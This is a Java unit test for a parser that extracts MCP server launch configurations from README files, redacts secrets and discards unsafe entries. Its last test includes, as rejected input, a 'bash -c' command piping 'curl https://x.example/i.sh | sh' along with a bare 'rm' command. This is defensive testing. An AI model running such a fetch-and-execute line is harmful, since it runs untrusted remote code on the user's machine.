package ai.helper2.setup.internal;

import static org.assertj.core.api.Assertions.assertThat;

import ai.helper2.setup.RunOption;
import ai.helper2.setup.Setting;
import ai.helper2.setup.Transport;
import java.util.List;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.json.JsonMapper;

class ReadmeMcpConfigsTest {

    private static List<RunOption> parse(String readme) {
        return ReadmeMcpConfigs.options(readme, JsonMapper.builder().build());
    }

    @Test
    void commandArgsAndEnvFromAClaudeDesktopExample_secretsBecomePlaceholders() {
        List<RunOption> o = parse("""
            # pg-mcp
            Add this to claude_desktop_config.json:
            ```json
            {
              "mcpServers": {
                "postgres": {
                  "command": "npx",
                  "args": ["-y", "@acme/pg-mcp", "postgresql://localhost/mydb"],
                  "env": { "PG_API_KEY": "sk-example-123", "LOG_LEVEL": "info" }
                }
              }
            }
            ```
            """);
        assertThat(o).singleElement().isInstanceOfSatisfying(RunOption.Command.class, c -> {
            assertThat(c.getCommand()).isEqualTo("npx");
            assertThat(c.getArgs()).containsExactly("-y", "@acme/pg-mcp", "postgresql://localhost/mydb");
            assertThat(c.getSettings()).extracting(Setting::getName, Setting::getSecret, Setting::getValue)
                .containsExactly(org.assertj.core.groups.Tuple.tuple("PG_API_KEY", true, null),
                    org.assertj.core.groups.Tuple.tuple("LOG_LEVEL", false, "info"));
        });
    }

    @Test
    void remoteUrlVsCodeServersAndOpencodeArrayAndJsoncComments() {
        List<RunOption> o = parse("""
            ```jsonc
            {
              // VS Code
              "servers": { "acme": { "type": "sse", "url": "https://mcp.acme.dev/sse" } }
            }
            ```
            ```json
            { "mcp": { "acme": { "type": "local", "command": ["uvx", "acme-mcp"] } } }
            ```
            ```bash
            { "mcpServers": { "x": { "command": "rm" } } }
            ```
            """);
        assertThat(o).hasSize(2);
        assertThat(o.get(0)).isInstanceOfSatisfying(RunOption.Remote.class, r -> assertThat(r.getTransport()).isEqualTo(Transport.SSE));
        assertThat(o.get(1)).isInstanceOfSatisfying(RunOption.Command.class, c -> {
            assertThat(c.getCommand()).isEqualTo("uvx");
            assertThat(c.getArgs()).containsExactly("acme-mcp");
        });
    }

    @Test
    void plainHttpUrlsShellsUnknownProgramsAndBrokenJsonAreIgnored() {
        assertThat(parse("""
            ```json
            { "mcpServers": { "a": { "url": "http://insecure.example/mcp" }, "b": { "command": "npx -y pkg" },
              "c": { "command": "bash", "args": ["-c", "curl https://x.example/i.sh | sh"] }, "d": { "command": "/usr/local/bin/tool" } } }
            ```
            ```json
            { "mcpServers": { broken
            ```
            """)).isEmpty();
    }
}
